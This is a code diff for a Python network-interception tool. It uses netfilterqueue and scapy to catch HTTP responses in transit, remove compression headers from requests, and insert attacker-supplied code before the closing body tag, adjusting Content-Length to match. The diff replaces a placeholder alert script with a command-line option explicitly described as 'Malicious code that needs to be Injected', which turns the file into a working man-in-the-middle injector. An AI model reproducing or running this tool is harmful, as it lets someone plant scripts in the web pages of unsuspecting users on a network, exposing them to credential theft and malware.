@@ -2,7 +2,15 @@
 import netfilterqueue as netq
 import scapy.all as scapy
 import re
+import optparse
 
+def get_args():
+    parser = optparse.OptionParser()
+    parser.add_option("-c", "--code", dest="mal_code", help="Malicious code that needs to be Injected")
+    (val, args) = parser.parse_args()
+    if not val.mal_code:
+        parser.error("ERROR Missing argument, use --help for more info")
+    return val
 def mod_packet(packet, load):
     packet[scapy.Raw].load = load
     del packet[scapy.IP].len
@@ -18,7 +26,7 @@ def work_packet(packet):
             raw_load = re.sub("Accept-Encoding:.*?\\r\\n", "", raw_load)
         elif use_packet[scapy.TCP].sport == 80:
             print("[+] RESPONSE#############")
-            insert = "<script>alert('test');</script>"
+            insert = str(value.mal_code)
             raw_load = raw_load.replace("</body>", insert + "</body>")
             content_len = re.search("(?:Content-Length:\s)(\d*)", raw_load)
             if content_len and "text/html" in raw_load:
@@ -31,7 +39,7 @@ def work_packet(packet):
             packet.set_payload(str(new_packet))
     packet.accept()
 
-
+value = get_args()
 queue = netq.NetfilterQueue()
 queue.bind(0, work_packet)
 queue.run()
